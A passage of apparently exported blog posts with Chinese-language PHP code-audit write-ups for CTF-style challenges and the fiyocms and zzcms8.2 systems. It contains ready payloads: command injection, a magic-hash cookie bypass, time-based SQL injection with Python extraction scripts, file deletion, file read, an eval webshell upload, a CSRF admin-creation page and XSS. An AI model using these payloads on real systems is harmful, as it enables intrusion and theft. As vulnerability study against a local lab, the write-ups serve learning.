ParamExtractor())-&gt;getCommand($_GET['p']);system('resizeImg image.png ' . $cmd);show_source(__FILE__); 这道题需要运行在php7的环境，开头的declare(strict_types=1);就是php7的一种新引入方式，作用是在函数调用时会对参数进行类型检查，举个例子： 12345678declare(strict_types=1);function addnum(int $a,int $b)&#123; return $a + $b;&#125;echo addnum(1,2); //输出3echo addnum('1','2'); //Fatal error: Uncaught TypeError:的错误 所以这就保证了最后通过$validate函数的$value都是数字且都大于0，但是这题漏洞在于array_walk这个函数，它不会对传入的参数做类型检查，也就是说它还是会按照php本身弱类型语言的特性对传入的参数做类型转化 例子如下： 12345678declare(strict_types=1);function addnum(int &amp;$value) &#123; $value = $value+1;&#125;$input = array('1a','2b');array_walk($input,addnum);var_dump($input); #array(2) &#123; [0]=&gt; int(2) [1]=&gt; int(3) &#125; 所以，我们很容易就能够进行任意命令执行，payload如下： 12?p[1]=1;touch info.php?p[1]=1;echo &apos;&lt;?php phpinfo(); ?&gt;&apos; &gt;&gt; info.php 这样就能向当前目录写入webshell Day22123456789101112131415161718&lt;?phpshow_source(__FILE__);if (isset($_POST['password'])) &#123; setcookie('hash', md5($_POST['password'])); header(\"Refresh: 0\"); exit;&#125;$password = '0e836584205638841937695747769655';if (!isset($_COOKIE['hash'])) &#123; echo '&lt;form&gt;&lt;input type=\"password\" name=\"password\" /&gt;' . '&lt;input type=\"submit\" value=\"Login\" &gt;&lt;/form &gt;'; exit;&#125; elseif (md5($_COOKIE['hash']) == $password) &#123; echo 'Login succeeded';&#125; else &#123; echo 'Login failed';&#125; 这题考察的就是PHP会将0e开头的值以科学计数法进行处理，例如0e123 == 0e321 这里cookie字段我们是可控的，所以我们只需要找到一个经过md5加密后开头是0e的值即可 payload： 1Cookie: hash=QNKCDZO","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/tags/代码审计/"}]},{"title":"代码审计--fiyocms","slug":"fiyocms审计","date":"2019-03-01T07:07:00.000Z","updated":"2019-03-02T08:48:01.938Z","comments":true,"path":"/posts/42478/","link":"","permalink":"https://Foxgrin.github.io/posts/42478/","excerpt":"记录fiyocms审计过程以及漏洞分析","text":"记录fiyocms审计过程以及漏洞分析 全局分析该CMS的核心分析页面是在/dapur/index.php中，这是一个管理员的后台管理页面，首先需要以管理的身份进行登录，登录后，我们可以发现，访问其中很多具体管理页面，都是通过GET方式向服务器提交参数，如添加用户功能，提交的是app参数和act参数，那么我们在Seay审计系统中通过全局搜索功能搜索关键参数app,观察是哪个具体的文件接收了这个参数 可以看出，/dapur/system/apps.php文件接收了app参数，于是跟进该文件 12345678910111213141516171819202122if(!empty($app))&#123; if(!file_exists(\"apps/app_$app/app_$app.php\")) &#123; function sysAdminApps() &#123; htmlRedirect('../'.siteConfig('backend_folder')); /* blank line */ &#125; function loadAdminApps() &#123; /* blank line */ &#125; &#125; else &#123; function sysAdminApps() &#123; $app=$_REQUEST['app']; baseSystem($app); &#125; function loadAdminApps() &#123; $app=$_REQUEST['app']; baseApps(\"app_\".$app); &#125; &#125;&#125; 当接收到app参数时，做出判断apps/app_$app/app_$app.php文件是否存在，如果存在定义两个方法：sysAdminApps()和loadAdminApps()，其中又调用了baseSystem()和baseApps()方法，我们继续搜索这两个方法的出处 12345678function baseApps($file)&#123; require (\"apps/$file/$file.php\"); &#125;function baseSystem($file)&#123; $file = \"apps/app_$file/sys_$file.php\"; if(file_exists($file)) include($file); &#125; 可以这两个方法发现包含了两个关键性文件，所以，管理界面每个功能都包含了两个关键文件，例如添加用户功能（$app=user），那么就有两个关键文件：apps/app_user/app_user.php和apps/app_user/sys_user.php需要我们去关注 漏洞分析任意文件删除位置/dapur/apps/app_config/controller/backuper.php 第16-30行 分析123456789101112131415if($_POST['type'] == 'database') &#123; @unlink(\"../../../../.backup/$_POST[file]\"); if(!file_exists('../../../../.backup')) mkdir('../../../../.backup'); $date = md5(date(\"Ymd:His\")); $file = \"db-backup-$date\"; $c = backup_tables(\"*\",'../../../../.backup',\"$file\",true); if($c) &#123; $size = format_size(filesize(\"../../../../.backup/$file.sql\")); $time = date(\"Y/m/d H:i:s\",filemtime(\"../../../../.backup/$file.sql\")); $r = \"$size - $time\"; echo \"&#123; \\\"file\\\":\\\"$file.sql\\\" , \\\"info\\\":\\\"$r\\\" &#125;\"; &#125; &#125; 其实这个文件存在非常多这个问题，通过POST传递的参数file没有经过任何处理就拼接进unlink函数进行文件删除操作 复现在网站根目录下建立demo.php文件 攻击payload如下： 123456789101112131415POST /dapur/apps/app_config/controller/backuper.php HTTP/1.1Host: 127.0.0.1Content-Length: 65Accept: */*Origin: http://127.0.0.1X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://127.0.0.1/dapur/index.php?app=config&amp;view=backupAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947Connection: closetype=database&amp;file=../demo.php demo.php被删除 SQL注入漏洞位置/system/database.php 第210-233行 分析123456789101112131415161718192021222324public function update($table,$rows,$where)&#123; $update = 'UPDATE '.$table.' SET '; $keys = array_keys($rows); for($i = 0; $i &lt; count($rows); $i++)&#123; if(is_string($rows[$keys[$i]]) AND $rows[$keys[$i]] !== '+hits') &#123; $update .= $keys[$i].'=\"'.$rows[$keys[$i]].'\"'; &#125; else &#123;if($rows[$keys[$i]] == '+hits') $rows[$keys[$i]] = $keys[$i] . '+'. 1; $update .= $keys[$i].'='.$rows[$keys[$i]]; &#125; // Parse to add commas if($i != count($rows)-1) &#123; $update .= ','; &#125; &#125; $update .= ' WHERE '.$where; 可以看到这里update语句中的where条件是通过直接拼接参数$where而成的，猜测可能通过$where参数构成sql注入，我们随便找一个带有update方法的实例，如/dapur/apps/app_user/controller.php 12345if(isset($_GET['stat'])) &#123; if($_GET['stat']=='1')&#123; $db-&gt;update(FDBPrefix.'user',array(\"status\"=&gt;\"1\"),'id='.$_GET['id']); alert('success',Status_Applied,1); &#125; 我们可以通过GET方式构造id参数构成SQL注入攻击 复现payload如下： 12345678910GET /dapur/apps/app_user/controller/status.php?stat=1&amp;id=1%20and%20if(ascii(substr(database(),1,1))=102,sleep(3),1) HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947Connection: close 成功造成延时注入 当然，delete方法也同样存在这个问题，就不赘述了 文件读取漏洞位置/dapur/apps/app_theme/libs/check_file.php 第13-26行 分析1234567891011121314$file = $url= \"$_GET[src]/$_GET[name]\"; $furl = \"../../../$url\";$content = strlen(\"$file\") - 5;$content = substr(\"$file\",$content);$file = strpos(\"$content\",\".\");$file = substr(\"$content\",$file+1);if($file == \"html\" || $file == \"htm\" || $file == \"xhtml\" || $file == \"js\" ||$file == \"jsp\" || $file == \"php\" || $file == \"css\" || $file == \"xml\" ) : $content = @file_get_contents($furl); $content = htmlentities($content);?&gt; 审计可知，当$file后缀名为指定文件后缀时，通过file_get_contents函数进行文件读取功能，而参数$furl是通过GET方式传入的参数src和name拼接而成的，这就构成了任意文件读取漏洞 复现Payload如下： 12345678910GET /dapur/apps/app_theme/libs/check_file.php?src=..&amp;name=config.php HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947Connection: close 读取的是网站根目录下的config.php文件，结果如下图所示 文件上传漏洞位置/dapur/apps/app_theme/libs/save_file.php 第23-27行 分析123$c = $_POST[\"content\"];$f = $_POST[\"src\"]; $w = file_put_contents($f,$c); 显而易见没有过滤参数就拼接在file_put_contents函数中，构成文件上传漏洞 复现Payload如下： 1234567891011121314POST /dapur/apps/app_theme/libs/save_file.php HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 62src=../../../../demo.php&amp;content=&lt;?php eval($_POST[&apos;cmd&apos;]); ?&gt; 在网站根目录下上传一个文件名为demo.php的一句话木马文件，结果如下图 成功上传一句话木马文件 CSRF添加超级用户位置/dapur/apps/app_user/sys_user.php 第110-123行 分析1234567891011121314if(isset($_POST['save']) or isset($_POST['apply']))&#123; $us=strlen(\"$_POST[user]\"); $ps=strlen(\"$_POST[password]\"); $user = $_POST['user']; $name = $_POST['name']; preg_match('/[^a-zA-Z0-9]+/', $user, $matches); if(!empty($_POST['password']) AND !empty($_POST['user'])AND !empty($_POST['name'])AND !empty($_POST['email'])AND !empty($_POST['level'])AND $_POST['password']==$_POST['kpassword'] AND $us&gt;2 AND $ps&gt;3 AND @ereg(\"^.+@.+\\\\..+$\",$_POST['email']) AND !$matches) &#123; $qr=$db-&gt;insert(FDBPrefix.'user',array(\"\",\"$user\",\"$name\",MD5(\"$_POST[password]\"),\"$_POST[email]\",\"$_POST[status]\",\"$_POST[level]\",date('Y-m-d H:i:s'),'',\"$_POST[bio]\")); 这是一个添加用户的程序，但是没有加入token验证，所以可以造成CSRF攻击，添加超级用户 复现我们先抓取添加用户的包，确定需要提交的参数，抓包结果如下 12345678910111213141516POST /dapur/?app=user&amp;act=add HTTP/1.1Host: 127.0.0.1Content-Length: 124Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/dapur/?app=user&amp;act=addAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947Connection: closeapply=Next&amp;id=&amp;z=&amp;user=test02&amp;z=&amp;x=&amp;password=test02&amp;kpassword=test02&amp;email=123%4012345.com&amp;level=1&amp;name=test02&amp;status=1&amp;bio= 构造好的用于建立超级用户的网页代码如下： 123456789101112131415161718192021222324&lt;html&gt;&lt;body&gt;&lt;form name=\"csrf\" action=\"http://127.0.0.1/dapur/?app=user&amp;act=add\" method=\"post\"&gt; &lt;input type=\"hidden\" name=\"apply\" value=\"Next\"&gt; &lt;input type=\"hidden\" name=\"id\" value=\"\"&gt; &lt;input type=\"hidden\" name=\"z\" value=\"\"&gt; &lt;input type=\"hidden\" name=\"user\" value=\"test66\"&gt; &lt;input type=\"hidden\" name=\"z\" value=\"\"&gt; &lt;input type=\"hidden\" name=\"x\" value=\"\"&gt; &lt;input type=\"hidden\" name=\"password\" value=\"test66\"&gt; &lt;input type=\"hidden\" name=\"kpassword\" value=\"test66\"&gt; &lt;input type=\"hidden\" name=\"email\" value=\"123&amp;#x40;12345&amp;#x2e;com\"&gt; &lt;input type=\"hidden\" name=\"level\" value=\"1\"&gt; &lt;input type=\"hidden\" name=\"name\" value=\"test66\"&gt; &lt;input type=\"hidden\" name=\"status\" value=\"1\"&gt; &lt;input type=\"hidden\" name=\"bio\" value=\"\"&gt;&lt;/form&gt; &lt;script type=\"text/javascript\"&gt; document.csrf.submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 用户访问https://127.0.0.1/demo.html，就会立即生成test66的超级用户 任意文件修改漏洞位置/dapur/apps/app_config/sys_config.php 第190-193行 分析1234$new_folder = $_POST['folder_new'];$old_folder = $_POST['folder_old'];if($old_folder != $new_folder) &#123; $ok = @rename(\"../$old_folder\",\"../$new_folder\"); 对POST传递的参数folder_new和folder_old未进行过滤拼接至rename函数进行文件名修改操作 复现Payload： 12345678910111213141516POST /dapur/?app=config HTTP/1.1Host: 127.0.0.1Content-Length: 517Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/dapur/?app=configAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947Connection: closeconfig_save=Simpan&amp;site_name=fiyocms&amp;title=Fast%2C+Save+%26+Elegant%21&amp;url=localhost&amp;mail=your%40site.net&amp;folder_new=config.txt&amp;folder_old=config.php&amp;status=1&amp;meta_keys=keyword+1%2C+keyword+two%2C+3rd+key&amp;meta_desc=&amp;sef=1&amp;https=0&amp;www=1&amp;follow_link=1&amp;title_type=1&amp;title_divider=+-+&amp;sef_ext=.html&amp;name=fiyocms&amp;member_registration=1&amp;member_activation=2&amp;member_group=5&amp;file_allowed=swf+flv+avi+mpg+mpeg+qt+mov+wmv+asf+rm+rar+zip+exe+msi+iso&amp;disk_space=500&amp;file_size=5120&amp;media_theme=oxygen&amp;lang=id&amp;timezone=Asia%2FJakarta 将网站根目录config.php文件修改成config.txt文件 直接可以查看网站的配置信息 后记该CMS存在大多的问题都是由于未对用户提交的参数进行过滤处理，导致一系列的漏洞发生，本次审计漏洞难度较简单，网站结构相对于zzcms较为复杂，还需要多加实践增加审计的经验","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/tags/代码审计/"}]},{"title":"代码审计--zzcms8.2","slug":"zzcms8.2审计","date":"2019-02-26T11:15:00.000Z","updated":"2019-03-01T07:07:40.288Z","comments":true,"path":"/posts/58925/","link":"","permalink":"https://Foxgrin.github.io/posts/58925/","excerpt":"记录zzcms8.2审计过程以及漏洞分析","text":"记录zzcms8.2审计过程以及漏洞分析 环境安装本地搭建的环境是phpstudy，在设置中打开允许目录列表（不然可能会出现403无法访问的情况），然后访问http://localhost/install进行安装 审计工具采用的审计工具是Seay源代码审计系统，将cms文件夹丢进去就可以帮助你分析出可能存在的漏洞以及对应的文件名，便于我们快速锁定漏洞所在，不用一个个文件去审计。 该审计工具还可以进行关键字的全局搜索功能，能帮助我们快速锁定关键函数等。 全局分析先进入网站根目录网站index.php，发现包含了关键的文件/inc/conn.php，跟进文件 1234567#/inc/conn.phpinclude(zzcmsroot.\"/inc/config.php\");include(zzcmsroot.\"/inc/wjt.php\");include(zzcmsroot.\"/inc/function.php\");include(zzcmsroot.\"/inc/zsclass.php\");include(zzcmsroot.\"/inc/stopsqlin.php\");include(zzcmsroot.\"/inc/area.php\"); 在conn.php文件中，可以看到又包含许多文件，其中stopsqlin.php文件很明显就是用来防止SQL注入，既然我们要寻找这个cms的漏洞，那么必然需要了解这个网站预防SQL注入的措施，所以继续跟进stopsqlin.php文件 12345678910111213141516171819#/inc/stopsqlin.phpfunction zc_check($string)&#123; if(!is_array($string))&#123; if(get_magic_quotes_gpc())&#123; return htmlspecialchars(trim($string)); &#125;else&#123; return addslashes(htmlspecialchars(trim($string))); &#125; &#125; foreach($string as $k =&gt; $v) $string[$k] = zc_check($v); return $string;&#125;if($_REQUEST)&#123; $_POST =zc_check($_POST); $_GET =zc_check($_GET); $_COOKIE =zc_check($_COOKIE); @extract($_POST); @extract($_GET); &#125; zc_check函数的作用的就是检查魔术引号功能是否开启，未开启的话就利用addslashes函数对全局变量$_REQUEST的特殊符号进行转义处理，防止SQL注入，这里我们就必须知道，当某个文件包含了/inc/conn.php，那么这个文件就对所有POST，GET或者COOKIE的中的变量进行了特殊字符的转义处理。 漏洞分析SQL注入漏洞1位置/user/check.php第二十行 分析123456789#/user/check.php&lt;?phpinclude(&quot;../inc/conn.php&quot;);if (!isset($_COOKIE[&quot;UserName&quot;]) || !isset($_COOKIE[&quot;PassWord&quot;]))&#123;echo &quot;&lt;script&gt;location.href=&apos;/user/login.php&apos;;&lt;/script&gt;&quot;;&#125;else&#123;$username=nostr($_COOKIE[&quot;UserName&quot;]); $rs=query(&quot;select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username=&apos;&quot;.$username.&quot;&apos; and password=&apos;&quot;.$_COOKIE[&quot;PassWord&quot;].&quot;&apos;&quot;);?&gt; 我们可以发现/user/check.php文件是包含了关键文件/inc/conn.php的，所以第一个查询语句 1query(\"select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username='\".$username.\"' and password='\".$_COOKIE[\"PassWord\"].\"'\"); 经过单引号包裹，并且$username和$password都来自全局变量COOKIE，所以无法进行SQL注入 在第二十行的第二个查询语句： 1query(\"UPDATE zzcms_user SET loginip = '\".getip().\"' WHERE username='\".$username.\"'\"); 我们可以发现拼接的参数是getip()函数的返回值，我们在Seay审计系统中对getip()函数进行全局搜索 12345678910111213141516#/inc/function.php&lt;?phpfunction getip()&#123; if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) $ip = getenv(&quot;HTTP_CLIENT_IP&quot;); else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) $ip = getenv(&quot;REMOTE_ADDR&quot;); else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) $ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; else $ip = &quot;unknown&quot;; return($ip); &#125; ?&gt; 可以发现ip我们是可以自己构造的，所以会导致SQL注入攻击 复现事先在/reg/userreg.php页面注册账号，账号名为test，密码为test，注意这里密码是以md5加密的形式存储在数据库中的 12#/reg/userregpost.php 第182行中注册成功后将用户信息写入zzcms_user表中query(\"INSERT INTO zzcms_user (username,password,passwordtrue,usersf,comane,content,somane,sex,phone,email,img,totleRMB,regdate,lastlogintime)VALUES('$username','\".md5($password).\"','$password','$usersf','$comane','&amp;nbsp;','$somane','1','$phone','$email','/image/nopic.gif','\".jf_reg.\"','\".date('Y-m-d H:i:s').\"','\".date('Y-m-d H:i:s').\"')\"); 注册用户后，我们就可以构造PAYLOAD进行SQL注入攻击了，这里关键参数ip字段我采用的是头部的X-Forwarded-For字段，因为是这里的SQL语句是UPDATE语句，所以我采用的是基于时间的盲注，给出我的payload: 12345678910GET /user/check.php HTTP/1.1Host: 127.0.0.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947;UserName=test;PassWord=098f6bcd4621d373cade4e832627b4f6X-Forwarded-For: 1.1.1.1&apos; and if(ascii(substr(database(),1,1))=122,sleep(3),1)#Connection: close 再贴上盲注的具体脚本： 12345678910111213141516171819202122import requests#/user/check.phpurl = \"http://127.0.0.1/user/check.php\"database = \"\"for i in range(1,50): flag = 0 for j in range(95,123): headers = &#123; \"Cookie\":\"UserName=test;PassWord=098f6bcd4621d373cade4e832627b4f6\", \"X-Forwarded-For\":\"1.1.1.1' and if(ascii(substr(database(),%d,1))=%d,sleep(3),1)#\"%(i,j) &#125; r = requests.get(url,headers=headers) t = r.elapsed.total_seconds() if t &gt;= 3: database = database + chr(j) flag = 1 break if flag == 0 and j == 122: print(\"database:\",database) break SQL注入漏洞2位置/user/del.php第139行 分析1234#/user/del.php 第139行&lt;?php $sql=&quot;select id,editor from &quot;.$tablename.&quot; where id =&apos;$id&apos;&quot;;?&gt; 这句SQL语句不同其他处的SQL语句，是通过两个变量$tablename和$id拼接而成的，更特别的是这里的$tablename是不同于特定情况的，我们跟进变量$tablename和$id 12345678910111213141516#/user/del.php&lt;?php$pagename=trim($_POST[\"pagename\"]);$tablename=trim($_POST[\"tablename\"]);$id=\"\";if(!empty($_POST['id']))&#123; for($i=0; $i&lt;count($_POST['id']);$i++)&#123; checkid($_POST['id'][$i]); $id=$id.($_POST['id'][$i].','); &#125; $id=substr($id,0,strlen($id)-1);//去除最后面的\",\"&#125;if (!isset($id) || $id==\"\")&#123;showmsg('操作失败！至少要选中一条信息。');&#125; 可知变量$id和$tablename都是经过POST方式获得，但是$id经过checkid的消毒处理，我们无法通过该变量进行攻击，再看$tablename，之后的switch语句对$tablename的值进行判断并分别执行对应的sql语句，我们跟进到135行，便可以发现此处的$tablename的值是排除上面所有特殊值的情况 1234567#/user/del.phpelse&#123;if (strpos($id,\",\")&gt;0)&#123; $sql=\"select id,editor from \".$tablename.\" where id in (\". $id .\")\";&#125;else&#123; $sql=\"select id,editor from \".$tablename.\" where id ='$id'\";&#125; 并且此处的SQL语句中的变量$tablename没有经过单引号包裹，所有我们可以通过这个变量进行SQL攻击 复现首先我们必须确定列id和editor是属于具体哪个表的 我们随机选取一个表zzcms_answer作为例子 payload如下： 12345678910111213POST /user/del.php HTTP/1.1Host: 127.0.0.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 68id=1&amp;tablename=zzcms_answer union select 1,2 and if(ascii(substr(database(),1,1))=122,sleep(3),1)# 因为这里采用的是基于时间的盲注，从zzcms_answer表中查询的结果有可能为空，如果为空，就不能执行后面的if语句，所以为了确保有查询结果，加入联合查询，保证有查询结果 下面附上盲注脚本： 12345678910111213141516171819202122#/user/del.phpimport requestsurl = \"http://127.0.0.1/user/del.php\"database = \"\"for i in range(1,50): flag = 0 for j in range(95,123): data = &#123; \"id\":\"1\", \"tablename\":\"zzcms_answer union select 1,2 and if(ascii(substr(database(),%d,1))=%d,sleep(3),1)#\"%(i,j) &#125; r = requests.post(url,data=data) t = r.elapsed.total_seconds() if t &gt;= 3: database = database + chr(j) flag = 1 break if flag == 0 and j == 122: print(\"database:\",database) break XSS漏洞1位置/install/step_6.php 第10-11行 分析123#/install/step_6.php 第10-11行管理员户名：&lt;?php echo $admin?&gt;&lt;br/&gt;管理员密码： &lt;?php echo $adminpwdtrue?&gt;&lt;br/&gt; 可以看出变量$admin和$adminpwdtrue直接打印出来，很可能存在XSS漏洞，我们继续跟进这两个变量 我们可以从文件名看出这是安装第六步的页面，那么我们就跟进到安装的index.php文件 1234#/install/index.php 第8,9,10行if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);$step = isset($_POST['step']) ? $_POST['step'] : 1; extract函数的作用是将数组的键名变成各个变量名，键名对应键值对应变量的值，并且我们发现一个变量$step，猜测可能跟安装的步骤有关，继续跟进该变量 1234567#/install/index.php 第52-124行switch($step)&#123; case '1':include 'step_'.$step.'.php'; ... case '6':include 'step_'.$step.'.php'; break;&#125; 发现当变量$step值为6时，就包含了step_6.php，而我们可以发现index.php的开头是没有包含之前所说的关键文件/inc/conn.php的，所以这里的POST和GET是没有经过转义处理的，所以$admin和$adminpwdtrue是可控的变量 复现PAYLOAD如下: 12345678910111213POST /install/ HTTP/1.1Host: 127.0.0.1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 42step=6&amp;admin=&lt;script&gt;alert(/xss/)&lt;/script&gt; 成功弹框 XSS漏洞2位置/inc/top.php 第3-5行 分析1234#/inc/top.php 第3-5行if (@$_POST[\"action\"]==\"search\")&#123;echo \"&lt;script&gt;location.href='\".@$_POST[\"lb\"].\"/search.php?keyword=\".@$_POST[\"keyword\"].\"'&lt;/script&gt;\";&#125; 我们可以注意到这个文件也是没有包含到关键文件/inc/conn.php，所以未对POST数据做消毒处理，这里就可以利用闭合标签的方式进行XSS攻击 复现PAYLOAD: 123456789101112131415POST /inc/top.php HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/inc/top.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 63action=search&amp;lb=&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt; 成功弹框 文件上传漏洞位置/uploadimg_form.php 文件提供了文件上传的功能 分析123456789/uploading_form.php 第61-68行&lt;form action=&quot;uploadimg.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; onSubmit=&quot;return mysub()&quot; style=&quot;padding:10px&quot; target=&quot;doaction&quot;&gt;&lt;div id=&quot;esave&quot; style=&quot;position:absolute; top:0px; left:0px; z-index:10; visibility:hidden; width: 100%; height: 77px; background-color: #FFFFFF; layer-background-color: #FFFFFF; border: 1px none #000000;&quot;&gt; &lt;div align=&quot;center&quot;&gt;&lt;br /&gt;&lt;img src=&quot;image/loading.gif&quot; width=&quot;24&quot; height=&quot;24&quot; /&gt;正在上传中...请稍候！&lt;/div&gt;&lt;/div&gt;&lt;input type=&quot;file&quot; name=&quot;g_fu_image[]&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;提交&quot; /&gt;&lt;input name=&quot;noshuiyin&quot; type=&quot;hidden&quot; id=&quot;noshuiyin&quot; value=&quot;&lt;?php echo @$_GET[&apos;noshuiyin&apos;]?&gt;&quot; /&gt;&lt;input name=&quot;imgid&quot; type=&quot;hidden&quot; id=&quot;imgid&quot; value=&quot;&lt;?php echo @$_GET[&apos;imgid&apos;]?&gt;&quot; /&gt;&lt;/form&gt; 通过表单内容我们可以看出，文件上传的位置是uploadimg.php文件，所以我们跟进该文件 12345678910111213141516171819#/uploadimg.php 第26-43行function upfile() &#123;//是否存在文件if (!is_uploaded_file(@$this-&gt;fileName[tmp_name]))&#123; echo \"&lt;script&gt;alert('请点击“浏览”，先选择您要上传的文件！\\\\n\\\\n支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;\"; exit;&#125;//检查文件大小if ($this-&gt;max_file_size*1024 &lt; $this-&gt;fileName[\"size\"])&#123; echo \"&lt;script&gt;alert('文件大小超过了限制！最大只能上传 \".$this-&gt;max_file_size.\" K的文件');parent.window.close();&lt;/script&gt;\";exit;&#125;//检查文件类型if (!in_array($this-&gt;fileName[\"type\"], $this-&gt;uptypes)) &#123; echo \"&lt;script&gt;alert('文件类型错误，支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;\";exit;&#125;//检查文件后缀$hzm=strtolower(substr($this-&gt;fileName[\"name\"],strpos($this-&gt;fileName[\"name\"],\".\")));//获取.后面的后缀，如可获取到.php.gifif (strpos($hzm,\"php\")!==false || strpos($hzm,\"asp\")!==false 